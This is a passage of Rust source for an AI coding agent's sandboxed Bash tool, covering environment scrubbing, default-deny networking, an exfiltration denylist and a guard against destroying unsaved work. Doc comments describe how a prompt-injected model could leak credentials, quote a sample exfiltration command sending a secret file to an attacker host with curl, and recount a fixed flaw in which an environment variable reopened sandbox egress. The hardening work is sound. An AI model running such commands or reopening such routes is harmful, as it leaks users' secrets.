use std::borrow::Cow;
use std::sync::Arc;
use std::time::Duration;

use async_trait::async_trait;
use serde_json::{Value, json};

use wcore_config::shell::bash_shell_argv_prefix;
use wcore_protocol::events::ToolCategory;
use wcore_sandbox::{
    NetworkPolicy, SandboxChunk, SandboxCommand, SandboxError, SandboxManifest, SandboxOutput,
    SyscallPolicy, backends::SandboxBackend, default_for_platform,
};
use wcore_types::tool::{JsonSchema, ToolEffectContract, ToolResult};

use crate::context::ToolContext;

mod policy;
use crate::{Tool, ToolOutputSink};
pub use policy::check_denylist;
use policy::{SandboxScope, annotate_masked_read, annotate_network_block, annotate_sandbox_denial};

const DEFAULT_TIMEOUT_MS: u64 = 120_000;
const MAX_TIMEOUT_MS: u64 = 600_000;

/// Build the `(SandboxManifest, SandboxCommand)` pair for a bash invocation.
///
/// The command string is run through the platform shell exactly as the
/// pre-S9 `shell_command` helper did: `sh -c <command>` on Unix,
/// `cmd /C <command>` on Windows. That argv is what the sandbox backend
/// spawns.
///
/// **Env (D.1 Round 1 — HIGH-2):** BashTool historically copied the
/// engine's *entire* host environment into the sandboxed child via
/// `std::env::vars().collect()`. The engine process holds provider API
/// keys, `WAYLAND_VAULT_PASSPHRASE`, cloud credentials, etc. in its env,
/// so that blanket copy handed every secret to every Bash command the
/// model runs — a prompt-injected model could exfiltrate them around the
/// string-pattern denylist. We now build a *curated* env via
/// [`crate::env_passthrough::build_sandboxed_env`]: locale / terminal /
/// toolchain-discovery vars (`PATH`, `HOME`, `LANG`, …) plus
/// skill/config-declared passthrough vars, with every secret-shaped name
/// (`*_API_KEY`, `*_TOKEN`, `*_SECRET`, `WAYLAND_VAULT_*`, …) dropped
/// unconditionally. `PATH` etc. still pass through so commands work.
///
/// **Network (M-3 / M-7 / sandbox-2 / tools-exec-15 / #657):** agent-initiated
/// Bash egress is gated on whether this is a GENUINELY-LOCAL session, NOT on
/// the workspace trust posture. [`NetworkPolicy::Inherit`] (so `git fetch`,
/// package installs, and `curl` just work) is granted ONLY when the session
/// has no channel tool posture (`channel_tool_posture.is_none()`, i.e. a local
/// CLI/TUI/json-stream/ACP/desktop entrypoint), via the `local_bash_network`
/// helper and the `with_network` grant applied at bootstrap. This distinction
/// is load-bearing: a channel-attached session (including a `Full`-posture
/// remote sender) also resolves to `WorkspaceTrust::Trusted` through
/// `trusted_local`, so gating on trust alone would hand a remote sender a
/// networked shell. Every channel path therefore stays on the fail-safe
/// [`NetworkPolicy::Deny`] lockdown, so a prompt-injected or remote command
/// (`curl --data-binary @secret https://attacker`) cannot exfiltrate
/// sandbox-readable data or reach internal/metadata endpoints. On a
/// non-local, non-channel session (an untrusted repository, or a Managed
/// execution floor) the operator's `[security] egress_allow` is the explicit
/// opt-in, via
/// [`workspace_policy::operator_bash_network`](crate::workspace_policy::operator_bash_network);
/// when no WorkspacePolicy is attached at all, the conservative default is
/// Deny.
///
/// Note: only sandbox backends that honour [`NetworkPolicy`] (bwrap,
/// sandbox-exec) actually enforce this. `NoSandboxBackend` ignores the
/// policy and runs with host network regardless (tracked separately as the
/// fail-open-to-NoSandbox finding M-2). The default flip is still the
/// correct hardening for every host with a real sandbox active.
///
/// **Syscall / FS confinement (M-4 / sandbox-3 — deliberate omission):**
/// `syscall_policy` is left [`SyscallPolicy::Inherit`] and the
/// `fs_read_allow` / `fs_write_allow` allowlists are intentionally empty.
/// `build_sandbox_pieces` has no `ToolContext` and therefore no project
/// root to scope a write-allow to; populating Landlock/seccomp with an
/// empty write-allow would forbid *all* writes (breaking every build/test
/// the model runs), and a guessed root would be worse than none. The bwrap
/// namespace + bind-mount isolation still applies; seccomp/Landlock remain
/// dormant for BashTool by design until a host-supplied project root is
/// threaded through. This is a documented defense-in-depth gap, not an
/// escape: the env is already secret-scrubbed and the network now defaults
/// closed.
///
/// Shorthand for [`build_sandbox_pieces_for_session`] with no session env
/// passthrough and `backend_enforces_read_deny = true`.
///
/// The `true` is inert rather than assumed: both production callers pass
/// `policy: None`, and with no policy there is no `fs_read_deny` to produce
/// whatever the flag says. It is also the conservative value — `true` COMPUTES
/// the list, which is #922 R1's stale-positive (availability-only) direction.
/// Keeping this two-argument shape is deliberate: the `#234` / `#667` unit
/// suite drives it with a policy, and that suite must keep grading the
/// enforcing path byte-for-byte as it did before #922.
fn build_sandbox_pieces(
    command: &str,
    policy: Option<&crate::workspace_policy::WorkspacePolicy>,
) -> (SandboxManifest, SandboxCommand) {
    build_sandbox_pieces_for_session(command, policy, None, true)
}

/// `backend_enforces_read_deny` is `SandboxBackend::enforces_read_deny()` read
/// off the SAME backend handle that will run `execute()` for this manifest —
/// so there is no window between reading the capability and applying it.
fn build_sandbox_pieces_for_session(
    command: &str,
    policy: Option<&crate::workspace_policy::WorkspacePolicy>,
    env_passthrough: Option<&std::collections::HashSet<String>>,
    backend_enforces_read_deny: bool,
) -> (SandboxManifest, SandboxCommand) {
    // Shell prefix honors the Windows WAYLAND_BASH_SHELL=powershell|pwsh override
    // (BashTool only); defaults to sh -c / cmd /C.
    let mut argv = bash_shell_argv_prefix();
    argv.push(command.to_string());
    let mut env = crate::env_passthrough::build_sandboxed_env_for(&[], env_passthrough);
    if policy.is_some_and(crate::workspace_policy::WorkspacePolicy::denies_git_authority_env) {
        env.retain(|(name, _)| {
            ![
                "GIT_DIR",
                "GIT_COMMON_DIR",
                "GIT_WORK_TREE",
                "GIT_INDEX_FILE",
                "GIT_OBJECT_DIRECTORY",
                "GIT_ALTERNATE_OBJECT_DIRECTORIES",
                "GIT_CONFIG",
                "GIT_CONFIG_COUNT",
                "GIT_CONFIG_PARAMETERS",
            ]
            .iter()
            .any(|denied| name.eq_ignore_ascii_case(denied))
        });
    }
    let mut manifest = SandboxManifest {
        network: default_bash_network_policy(),
        // Curated env — secrets excluded, see the doc-comment above. A child
        // workspace policy additionally strips Git authority redirects.
        env,
        // M-4 / sandbox-3: left Inherit / empty on purpose — see doc above.
        syscall_policy: SyscallPolicy::Inherit,
        ..Default::default()
    };
    let mut cwd = None;
    if let Some(p) = policy {
        manifest.fs_write_allow = p.writable_roots();
        manifest.fs_read_allow = p.readable_roots();
        // #234: recompute per-exec (not the frozen construction-time list) so a
        // secret CREATED after bootstrap (pulled *.pem, generated terraform.tfstate)
        // is denied on the next command — closing the Bash TOCTOU that the file
        // tools' dynamic `is_project_secret` guard already avoids. Local-keyboard
        // (Trusted, no project-secret denial) is returned unchanged, no walk.
        // #922 R1: on a backend that does not enforce this field the walk
        // below produces a value the backend discards. See
        // `WorkspacePolicy::secret_deny_paths_for_backend`.
        manifest.fs_read_deny = p.secret_deny_paths_for_backend(backend_enforces_read_deny);
        // Stat-only, never content — see
        // `SandboxManifest::fs_metadata_read_allow`. Assigned after
        // `fs_read_deny` for readability only: SBPL last-match-wins is what
        // makes the deny authoritative, and the backend emits in that order.
        manifest.fs_metadata_read_allow = p.metadata_readable_roots();
        // The policy's confined values REPLACE any same-named entry the
        // ambient passthrough already contributed, rather than being appended
        // beside it.
        //
        // `BASE_SANDBOX_ENV_ALLOWLIST` passes TMPDIR/TMP/TEMP through from the
        // host, and the policy then supplies its own pointing INTO the private
        // scratch. A bare `extend` left both in the manifest, so a delegated
        // shell that must write only into checkout+scratch was also handed the
        // real user temp directory, and which one the child honoured was
        // undefined. Linux hid this because TMPDIR is usually unset there, so
        // only the confined entry existed; macOS always sets it, which is the
        // only reason it was ever observed.
        let overridden: std::collections::HashSet<&str> =
            p.cache_env().iter().map(|(k, _)| k.as_str()).collect();
        manifest
            .env
            .retain(|(k, _)| !overridden.contains(k.as_str()));
        manifest.env.extend(p.cache_env().iter().cloned());
        manifest.network = p.network();
        cwd = Some(p.root().to_path_buf());
    }
    (manifest, SandboxCommand { argv, cwd })
}

/// PowerShell cannot run under the AppContainer sandbox — it needs .NET / GAC
/// assemblies that fail to load under the Low-integrity restricted token
/// (`STATUS_DLL_NOT_FOUND`, 0xC0000135). When the active backend reports
/// [`SandboxBackend::blocks_powershell`], a `powershell`/`pwsh` shell selection
/// (via `WAYLAND_BASH_SHELL` / `[tools] windows_shell`) would make EVERY Bash
/// command hard-fail. The shell is an implementation detail of "run this
/// command", so downgrade the prefix to `cmd /C`, preserving the user's command,
/// and warn once. See FerroxLabs/wayland#413.
fn downgrade_powershell_for_sandbox(argv: &mut Vec<String>, blocks_powershell: bool) {
    if !blocks_powershell {
        return;
    }
    let is_powershell = argv.first().is_some_and(|s| {
        let stem = s.strip_suffix(".exe").unwrap_or(s);
        stem.eq_ignore_ascii_case("powershell") || stem.eq_ignore_ascii_case("pwsh")
    });
    if !is_powershell {
        return;
    }
    // The powershell/pwsh prefix is `[shell, "-NoProfile", "-Command", <command>]`;
    // the user's command is the last element. Replace the whole prefix with the
    // canonical cmd one — taken from `wcore_config::shell` rather than spelled
    // out here, because that prefix carries the `/S` the payload quoting on the
    // spawn path depends on (#943) and a second copy would silently drift.
    let command = argv.last().cloned().unwrap_or_default();
    static WARNED: std::sync::Once = std::sync::Once::new();
    WARNED.call_once(|| {
        tracing::warn!(
            target: "wcore_tools",
            "configured Bash shell is PowerShell, which cannot run under the active \
             sandbox (AppContainer Low-integrity token); falling back to `cmd /C`. \
             Set `[tools] windows_shell = cmd` (or WAYLAND_BASH_SHELL=cmd) to silence this."
        );
    });
    *argv = wcore_config::shell::windows_cmd_payload_prefix();
    argv.push(command);
}

/// Whether a freshly selected legacy platform backend enforces
/// secret-read-deny at the OS layer (`SandboxBackend::enforces_read_deny()`).
///
/// Retained for direct compatibility tests. Hosted sessions must query their
/// registry-owned [`SandboxRegistry`] so capability checks and execution use
/// the same immutable backend.
/// P2b — refuse a shell command that would throw away unsaved user work.
///
/// The shell runs in the workspace root when a policy supplies one and in the
/// process directory otherwise. Git resolves the command's relative paths
/// against that same directory, so the guard is asked about it and not about
/// some other tree.
fn unsaved_shell_refusal(
    command: &str,
    workspace: Option<&crate::workspace_policy::WorkspacePolicy>,
) -> Option<String> {
    let cwd = match workspace {
        Some(policy) => policy.root().to_path_buf(),
        None => std::env::current_dir().ok()?,
    };
    crate::unsaved_work::shell_refusal(command, &cwd)
}

/// #1142 — the ceiling on the P2b unsaved-work guard's own cost.
///
/// [`unsaved_shell_refusal`] runs BEFORE the caller's deadline is armed, so
/// until this bound existed its cost sat outside the only clock that could
/// stop it. That is the same shape as the pre-timeout secret-deny walk behind
/// #1000/#921/#1002, where an unbounded pre-timeout walk turned a single
/// `echo` into an apparent HANG — 39,794 ms on a 1.17M-file tree — rather than
/// a timeout with a message.
///
/// It may NOT be closed by folding the guard under the caller's deadline and
/// letting it pass on expiry. The guard exists to refuse a command that would
/// destroy work existing nowhere else; one that gives up under time pressure
/// and lets the command through is strictly worse than an unbounded one. So
/// expiry REFUSES — see [`bounded_unsaved_shell_refusal`].
///
/// Making the guard cheap enough for a bound not to matter was measured and
/// rejected. On hetzner-dsm, 2026-08-27, interleaved, n=6:
///
/// | shape                                    | measured                     |
/// |------------------------------------------|------------------------------|
/// | `git checkout .`, 40k-file tree, warm    | 14.8 ms, of which 12.4 ms is ONE `git status --porcelain -uno` |
/// | `git checkout .`, 40k-file tree, cold    | 1,396 ms (recorded in-tree by #1111) |
/// | `rm -rf <dir>`, per file underneath it   | 1.3 ms, linear — 124 ms at 100 files, 276 ms at 200 |
///
/// 84% of the git path is one subprocess that has to compare the whole work
/// tree, so there is nothing to prefilter (the command names the whole tree)
/// and nothing to parallelise (it is one process). The rm path parallelises,
/// but both stay O(work tree) with no ceiling, which is the property under
/// complaint. A constant-factor win does not bound anything.
///
/// 10 s is ~7x the cold 40k-file `git checkout .` cost, so a tree an order of
/// magnitude larger still answers rather than being refused; ~2x the 5.3 s
/// that the rm path's own 4096-file walk budget implies at 1.3 ms each; and
/// far below the 39,794 ms #1000 measured as reading like a hang.
///
/// Always taken as `min(caller timeout, this)`: the guard may never spend more
/// than the entire budget the caller asked for.
const UNSAVED_GUARD_BUDGET_MS: u64 = 10_000;

/// Prefix on every refusal produced because the unsaved-work guard did not
/// ANSWER, as opposed to one produced because it found lines at risk.
///
/// Owned here so the producer and anything matching on it cannot drift apart.
pub(crate) const UNSAVED_GUARD_UNANSWERED_PREFIX: &str =
    "Refused to run this command: the unsaved-work check did not finish";

/// The refusal returned when the guard did not answer, saying which way the
/// unknown falls and why.
fn unsaved_guard_unanswered(why: &str) -> String {
    format!(
        "{UNSAVED_GUARD_UNANSWERED_PREFIX} — {why}. Nothing ran. Whether this command \
         would destroy lines that are on disk and in no commit is therefore UNKNOWN, \
         and an unknown answer has to refuse: of the two ways to be wrong, only \
         letting it through cannot be undone. Name the paths you actually mean, or \
         commit the work first, and run it again. Raising `timeout` only helps while \
         it is still below the guard's own {UNSAVED_GUARD_BUDGET_MS}ms ceiling — above \
         that the ceiling binds and the answer will not change."
    )
}

/// Run the P2b unsaved-work guard under a ceiling, FAIL-CLOSED.
///
/// `Some(_)` is a refusal to return to the caller; `None` means nothing the
/// command would discard is unsaved. There is exactly ONE way to reach `None`
/// — the guard finishing and saying so. Expiry, a panic inside the guard and a
/// runtime that dropped the task all return `Some(_)`, because the question
/// "would this destroy the user's only copy?" was not answered, and an
/// unanswered destructive command is refused.
///
/// The guard runs on the blocking pool for the reason [`spawn_manifest_build`]
/// gives: it walks the work tree and spawns `git` synchronously and never
/// yields, so called inline from an `async fn` it pins the runtime thread and
/// no timer can fire until it is done. Wrapping an inline call in
/// `tokio::time::timeout` would bound nothing at all.
///
/// On expiry the blocking task is left to finish — `spawn_blocking` cannot be
/// aborted — so it costs one pool thread until the walk it is in ends. That is
/// the same residual `spawn_manifest_build` already carries, and it is bounded
/// by the walk, not by the caller.
async fn bounded_unsaved_shell_refusal(
    command: &str,
    workspace: Option<Arc<crate::workspace_policy::WorkspacePolicy>>,
    timeout: Duration,
) -> Option<String> {
    let budget = timeout.min(Duration::from_millis(UNSAVED_GUARD_BUDGET_MS));
    let owned = command.to_string();
    let task =
        tokio::task::spawn_blocking(move || unsaved_shell_refusal(&owned, workspace.as_deref()));
    match tokio::time::timeout(budget, task).await {
        Ok(Ok(verdict)) => verdict,
        Ok(Err(join)) => Some(unsaved_guard_unanswered(&format!(
            "it could not be run to completion ({join})"
        ))),
        Err(_) => Some(unsaved_guard_unanswered(&format!(
            "it was still running after {} ms",
            budget.as_millis()
        ))),
    }
}

pub fn platform_enforces_read_deny() -> bool {
    default_for_platform().enforces_read_deny()
}

/// Fail-safe network policy every `WorkspacePolicy` constructor is seeded
/// with: agent-initiated Bash gets no egress until something with TRUSTED
/// provenance grants it.
///
/// SEC-11 (W2/W3 conformance gate, Linux, reproduced 3/3): this used to read
/// `WAYLAND_BASH_ALLOW_NETWORK` and return [`NetworkPolicy::Inherit`] when it
/// was `1`/`true`, so a bare environment variable re-opened the sandboxed
/// shell's egress — a driver-owned listener recorded `accept_count=1`. The
/// environment is UNTRUSTED provenance: it is inherited from whatever launched
/// the process (a CI job, a parent agent, a `direnv` file that travels with a
/// cloned repository). Raising a boundary from there is the same supply-chain
/// hazard `SecurityConfig::enabled` is already documented against — *"Disabling
/// is config-file only (never a bare env var — supply-chain hazard, C8)"* — so
/// the lever is gone rather than tightened.
///
/// The replacement, with the polarity the right way round, is the operator's
/// config-file allowlist: see
/// [`workspace_policy::operator_bash_network`](crate::workspace_policy::operator_bash_network).
pub(crate) fn default_bash_network_policy() -> NetworkPolicy {
    NetworkPolicy::Deny
}

/// Render a `SandboxOutput` into the `ToolResult` shape BashTool has always
/// returned, so routing through the sandbox does not change observable
/// output for any caller.
///
/// stderr is surfaced VERBATIM. An earlier revision stripped every line
/// mentioning `/private/var/select/sh` as "sandbox-init noise" (F-078). Those
/// lines were not noise: they read
/// `Error opening /private/var/select/sh: Operation not permitted` and were a
/// real seatbelt denial caused by a gap in our own SBPL profile (fixed in
/// `wcore_sandbox::backends::sandbox_exec::build_profile`). The filter deleted
/// the only evidence of the defect it was masking, so no stderr line may be
/// suppressed here again — a profile gap must be fixed in the profile.
/// Prefix on every BashTool result that describes a child which ran to
/// completion, whatever its exit status.
///
/// Owned here and matched by [`BashTool::error_is_tool_fault`] through this
/// same constant, so the producer and the classifier cannot drift apart.
pub(crate) const COMPLETED_CHILD_PREFIX: &str = "Exit code: ";

/// Prefix on every BashTool result describing a command the sandbox refused
/// before starting any child. Says plainly that nothing ran, which
/// "Failed to execute command" did not.
pub(crate) const REFUSED_PREFIX: &str = "Command refused, nothing ran: ";

/// Render a backend error, keeping a deterministic refusal (no child started,
/// caller-fixable by reshaping the command) distinguishable from a genuine
/// execution failure (the spawn or the wait broke).
fn exec_error_to_result(e: &SandboxError) -> ToolResult {
    let content = match e {
        SandboxError::RequestRefused(detail) => format!("{REFUSED_PREFIX}{detail}"),
        other => format!("Failed to execute command: {other}"),
    };
    ToolResult {
        content,
        is_error: true,
    }
}

/// #1076: appended to any Bash result whose bytes had to be decoded lossily.
///
/// `String::from_utf8_lossy` substitutes U+FFFD for every invalid byte and
/// says nothing about it, so a model reading a binary or mis-encoded payload
/// gets plausible text with no signal that it is not what the command wrote —
/// and can then reason, diff or re-write against characters that were never
/// there. One constant shared by all three decode sites so the buffered and
/// the two streaming paths cannot drift into different wordings.
pub(crate) const LOSSY_OUTPUT_NOTE: &str = "\n[wayland] Some output bytes were \
    not valid UTF-8 and were replaced with U+FFFD. The text above is not a \
    faithful copy of what the command wrote.";

/// Lossy-decode `bytes`, reporting whether anything was actually replaced.
///
/// `Cow::Owned` is the exact signal: `from_utf8_lossy` borrows its input
/// unchanged when it is already valid UTF-8 and only allocates when it has to
/// substitute. The two obvious alternatives are both wrong — comparing byte
/// count to char count flags every faithful multi-byte payload, and scanning
/// the output for U+FFFD flags output that legitimately contains one.
fn decode_lossy(bytes: &[u8]) -> (Cow<'_, str>, bool) {
    let text = String::from_utf8_lossy(bytes);
    let lossy = matches!(text, Cow::Owned(_));
    (text, lossy)
}

/// Forward `bytes` to the sink line-by-line, appending each line (with a
/// trailing newline) to `buf` so the final result matches the pre-S9
/// line-buffered shape. Returns true when the chunk had to be decoded lossily.
///
/// Module-level rather than nested inside each streaming path: the two copies
/// were byte-identical and #1076 needs the same lossy signal out of both.
///
/// A chunk boundary that splits a multi-byte sequence also reports true. That
/// is not a false positive — the text this call emitted to the sink really did
/// carry a U+FFFD the command never wrote.
fn drain_lines(bytes: &[u8], sink: &dyn ToolOutputSink, buf: &mut String) -> bool {
    let (text, lossy) = decode_lossy(bytes);
    for line in text.lines() {
        sink.emit_chunk(line);
        buf.push_str(line);
        buf.push('\n');
    }
    lossy
}

fn output_to_result(output: SandboxOutput) -> ToolResult {
    let (stdout, stdout_lossy) = decode_lossy(&output.stdout);
    let (stderr, stderr_lossy) = decode_lossy(&output.stderr);
    let exit_code = output.exit_code;
    let mut content = format!(
        "Exit code: {}\nSTDOUT:\n{}\nSTDERR:\n{}",
        exit_code, stdout, stderr
    );
    if stdout_lossy || stderr_lossy {
        content.push_str(LOSSY_OUTPUT_NOTE);
    }
    ToolResult {
        content,
        is_error: exit_code != 0,
    }
}

/// #1111 — run the manifest build on the blocking pool.
///
/// `build_sandbox_pieces_for_session` calls
/// `WorkspacePolicy::secret_deny_paths_for_backend`, which walks the whole
/// workspace synchronously and never yields. Called inline from an async fn it
/// pins the runtime thread, so neither `ctx.cancel.cancelled()` nor the
/// caller's timeout timer can be polled until the walk finishes: Esc does
/// nothing and `timeout` does not bound it. `tokio::select!` alone cannot fix
/// that — the walk would still run to completion while the select is being
/// constructed. It needs a real await point, which is what this provides.
///
/// Measured on Linux (hetzner, live bwrap, 91,633-entry tree): 1,253 ms cold /
/// ~800 ms warm, ~8.5 us/entry and linear, and only the
/// contained/channel/remote/Managed posture pays it at all — `trusted_local`
/// measured 0.18 ms on the same tree because `secret_read_deny_required` is
/// false there. So this is a cancellability and boundedness fix, NOT a
/// throughput fix, and nothing here caches or prunes:
///
/// * No memoisation. `readable_roots()` filters grants against
///   `SystemTime::now()`, so the correct deny list changes with no mutation
///   call at all and any cache key without "now" in it is wrong (#234).
/// * No prune. See the guard at `workspace_policy.rs:1417-1425` and
///   `no_prune_survives_the_922_backend_gate`.
fn spawn_manifest_build(
    command: &str,
    workspace: Option<Arc<crate::workspace_policy::WorkspacePolicy>>,
    sandbox: Arc<wcore_sandbox::SandboxRegistry>,
    backend_enforces_read_deny: bool,
) -> tokio::task::JoinHandle<(SandboxManifest, SandboxCommand)> {
    let command = command.to_string();
    tokio::task::spawn_blocking(move || {
        build_sandbox_pieces_for_session(
            &command,
            workspace.as_deref(),
            Some(sandbox.env_passthrough()),
            backend_enforces_read_deny,
        )
    })
}

pub struct BashTool;

#[async_trait]
impl Tool for BashTool {
    fn name(&self) -> &str {
        "Bash"
    }

    /// A shell is not sick because the command it was handed failed.
    ///
    /// Two shapes are the caller's request failing, not this tool's
    /// machinery, and neither may count toward the Bash circuit breaker:
    /// a child that ran to completion with a non-zero status, and a request
    /// the transport refused before starting any child. A timeout, a
    /// cancellation or a broken spawn still counts — those are the wedging
    /// the breaker exists for.
    fn error_is_tool_fault(&self, content: &str) -> bool {
        !(content.starts_with(COMPLETED_CHILD_PREFIX) || content.starts_with(REFUSED_PREFIX))
    }

    fn description(&self) -> &str {
        "Executes a shell command and returns its output.\n\n\
         IMPORTANT: Do NOT use Bash when a dedicated tool is available:\n\
         - File search: use Glob (not find or ls)\n\
         - Content search: use Grep (not grep or rg)\n\
         - Read files: use Read (not cat, head, or tail)\n\
         - Edit files: use Edit (not sed or awk)\n\
         - Write files: use Write (not echo or cat with heredoc)\n\
         - Web access: the Bash sandbox has NO NETWORK — curl/wget/git-fetch \
         and other network commands fail (empty output). To read a URL use the \
         WebFetch tool; to search the web use the `web` tool with operation \
         \"search\". Do NOT retry with curl/wget.\n\n\
         # Instructions\n\
         - Use absolute paths to avoid working directory confusion.\n\
         - When issuing multiple independent commands, make parallel tool calls \
         instead of chaining them. Use `&&` only when commands depend on each other.\n\
         - You may specify an optional timeout in milliseconds (default 120000, max 600000).\n\n\
         # Git safety\n\
         - Never force push, reset --hard, or use --no-verify unless explicitly asked.\n\
         - Prefer creating new commits over amending existing ones."
    }

    fn input_schema(&self) -> JsonSchema {
        json!({
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The command to execute"
                },
                "timeout": {
                    "type": "integer",
                    "description": "Timeout in milliseconds (default 120000, max 600000)"
                }
            },
            "required": ["command"]
        })
    }

    fn is_concurrency_safe(&self, _input: &Value) -> bool {
        false
    }

    fn effect_contract(&self, _input: &Value) -> ToolEffectContract {
        // Shell commands can mutate arbitrary host state with no general reconciler.
        ToolEffectContract::default()
    }

    async fn execute(&self, input: Value) -> ToolResult {
        // S9: buffered path now routes through the sandbox backend
        // (`SandboxBackend::execute`). On `NoSandboxBackend` (the default
        // when no real sandbox is available, or `WAYLAND_SANDBOX=none`)
        // this is byte-identical to the pre-S9 `shell_command` path.
        let Some(command) = input["command"].as_str() else {
            return ToolResult {
                content: "Missing required parameter: command".to_string(),
                is_error: true,
            };
        };

        // Wave SA — credential exfiltration denylist. Refuse before
        // spawning a shell at all.
        // #693 — the non-bypassable command floor. FIRST, before every other
        // guard: it answers below approval mode, --force, sandbox selection and
        // every escape-hatch environment variable, so nothing above it can
        // decide not to ask.
        if let Some(refusal) = wcore_config::command_floor::floor_refusal(command, None) {
            return ToolResult {
                content: refusal,
                is_error: true,
            };
        }

        if let Some(reason) = check_denylist(command) {
            return ToolResult {
                content: reason.to_string(),
                is_error: true,
            };
        }

        let timeout_ms = input["timeout"]
            .as_u64()
            .unwrap_or(DEFAULT_TIMEOUT_MS)
            .min(MAX_TIMEOUT_MS);

        // P2b — a command that discards the work tree may not take the user's
        // unsaved lines with it. Same question Write's guard asks, asked of the
        // shell, before any shell is spawned.
        //
        // #1142: bounded, and fail-closed on expiry. Fixing only the ctx paths
        // would leave this one live, which is the mistake the note on the
        // `deadline` below already records once.
        if let Some(refusal) =
            bounded_unsaved_shell_refusal(command, None, Duration::from_millis(timeout_ms)).await
        {
            return ToolResult {
                content: refusal,
                is_error: true,
            };
        }

        let timeout = Duration::from_millis(timeout_ms);

        let backend = default_for_platform();
        let (manifest, mut cmd) = build_sandbox_pieces(command, None);
        downgrade_powershell_for_sandbox(&mut cmd.argv, backend.blocks_powershell());

        let result = tokio::time::timeout(timeout, backend.execute(&manifest, cmd)).await;

        match result {
            Ok(Ok(output)) => annotate_network_block(
                command,
                default_bash_network_policy(),
                output_to_result(output),
            ),
            Ok(Err(e)) => exec_error_to_result(&e),
            Err(_) => ToolResult {
                content: format!("Command timed out after {}ms", timeout_ms),
                is_error: true,
            },
        }
    }

    /// W7 F4 / S9: streaming variant. Routes through
    /// `SandboxBackend::execute_streaming`, consuming the resulting
    /// `mpsc::Receiver<SandboxChunk>`. Each chunk is split into lines and
    /// forwarded to `ToolOutputSink::emit_chunk` (preserving the W7
    /// line-per-chunk sink contract) while also buffered so the final
    /// `ToolResult` content stays byte-identical to the non-streaming
    /// path.
    ///
    /// Note on granularity: when the active backend uses the default
    /// `execute_streaming` impl (e.g. `NoSandboxBackend`), output is
    /// delivered as one buffered chunk on completion rather than line by
    /// line as the child runs. The final `ToolResult` is unchanged; only
    /// the timing of intermediate `emit_chunk` calls differs. A backend
    /// with native streaming delivers chunks incrementally.
    async fn execute_streaming(&self, input: Value, sink: &dyn ToolOutputSink) -> ToolResult {
        let Some(command) = input["command"].as_str() else {
            return ToolResult {
                content: "Missing required parameter: command".to_string(),
                is_error: true,
            };
        };

        // Wave SA — credential exfiltration denylist (streaming path).
        // #693 — the non-bypassable command floor. FIRST, before every other
        // guard: it answers below approval mode, --force, sandbox selection and
        // every escape-hatch environment variable, so nothing above it can
        // decide not to ask.
        if let Some(refusal) = wcore_config::command_floor::floor_refusal(command, None) {
            return ToolResult {
                content: refusal,
                is_error: true,
            };
        }

        if let Some(reason) = check_denylist(command) {
            return ToolResult {
                content: reason.to_string(),
                is_error: true,
            };
        }

        let timeout_ms = input["timeout"]
            .as_u64()
            .unwrap_or(DEFAULT_TIMEOUT_MS)
            .min(MAX_TIMEOUT_MS);

        // P2b — a command that discards the work tree may not take the user's
        // unsaved lines with it. Same question Write's guard asks, asked of the
        // shell, before any shell is spawned.
        //
        // #1142: bounded, and fail-closed on expiry. Fixing only the ctx paths
        // would leave this one live, which is the mistake the note on the
        // `deadline` below already records once.
        if let Some(refusal) =
            bounded_unsaved_shell_refusal(command, None, Duration::from_millis(timeout_ms)).await
        {
            return ToolResult {
                content: refusal,
                is_error: true,
            };
        }
        let timeout = Duration::from_millis(timeout_ms);

        // `execute_streaming` takes `self: Arc<Self>` so the backend can
        // own a handle in its background task — wrap the boxed backend.
        let backend: Arc<dyn SandboxBackend> = Arc::from(default_for_platform());
        let (manifest, mut cmd) = build_sandbox_pieces(command, None);
        downgrade_powershell_for_sandbox(&mut cmd.argv, backend.blocks_powershell());

        let mut rx = match backend.execute_streaming(&manifest, cmd) {
            Ok(rx) => rx,
            Err(e) => {
                return exec_error_to_result(&e);
            }
        };

        let mut stdout_buf = String::new();
        let mut stderr_buf = String::new();
        let mut exit_code: Option<i32> = None;

        // #1076: true once any chunk on either stream had to be decoded
        // lossily. Tracked across the whole run because the note describes the
        // combined content, not one chunk.
        let mut lossy = false;

        let run = async {
            while let Some(chunk) = rx.recv().await {
                match chunk {
                    SandboxChunk::Stdout(bytes) => {
                        lossy |= drain_lines(&bytes, sink, &mut stdout_buf);
                    }
                    SandboxChunk::Stderr(bytes) => {
                        lossy |= drain_lines(&bytes, sink, &mut stderr_buf);
                    }
                    SandboxChunk::Exit {
                        exit_code: code, ..
                    } => {
                        exit_code = Some(code);
                    }
                }
            }
        };

        if tokio::time::timeout(timeout, run).await.is_err() {
            return ToolResult {
                content: format!("Command timed out after {}ms", timeout_ms),
                is_error: true,
            };
        }

        // A closed channel with no terminal `Exit` chunk means the child
        // never ran (backend `execute` returned `Err`). Surface it as an
        // execution failure rather than reporting a misleading exit code.
        let Some(exit_code) = exit_code else {
            let detail = if stderr_buf.is_empty() {
                "sandbox produced no exit status".to_string()
            } else {
                stderr_buf.trim_end().to_string()
            };
            return ToolResult {
                content: format!("Failed to execute command: {}", detail),
                is_error: true,
            };
        };

        let mut content = format!(
            "Exit code: {}\nSTDOUT:\n{}\nSTDERR:\n{}",
            exit_code, stdout_buf, stderr_buf
        );
        if lossy {
            content.push_str(LOSSY_OUTPUT_NOTE);
        }
        annotate_network_block(
            command,
            default_bash_network_policy(),
            ToolResult {
                content,
                is_error: exit_code != 0,
            },
        )
    }

    /// W8a A.4 / Task-4: ctx-aware non-streaming path. Derives the OS-sandbox
    /// manifest from `ctx.workspace` (cwd, allowlists, cache env, network), then
    /// races cancel against the buffered backend execute with a timeout, so
    /// `Bash sleep 30` is interruptible in <500ms when the agent signals cancel (S2).
    async fn execute_with_ctx(&self, input: Value, ctx: &ToolContext) -> ToolResult {
        let Some(command) = input["command"].as_str() else {
            return ToolResult {
                content: "Missing required parameter: command".to_string(),
                is_error: true,
            };
        };
        // #693 — the non-bypassable command floor. FIRST, before every other
        // guard: it answers below approval mode, --force, sandbox selection and
        // every escape-hatch environment variable, so nothing above it can
        // decide not to ask.
        if let Some(refusal) = wcore_config::command_floor::floor_refusal(
            command,
            ctx.workspace.as_deref().map(|p| p.root()),
        ) {
            return ToolResult {
                content: refusal,
                is_error: true,
            };
        }

        if let Some(reason) = check_denylist(command) {
            return ToolResult {
                content: reason.to_string(),
                is_error: true,
            };
        }

        let timeout_ms = input["timeout"]
            .as_u64()
            .unwrap_or(DEFAULT_TIMEOUT_MS)
            .min(MAX_TIMEOUT_MS);
        let timeout = Duration::from_millis(timeout_ms);

        // P2b — a command that discards the work tree may not take the user's
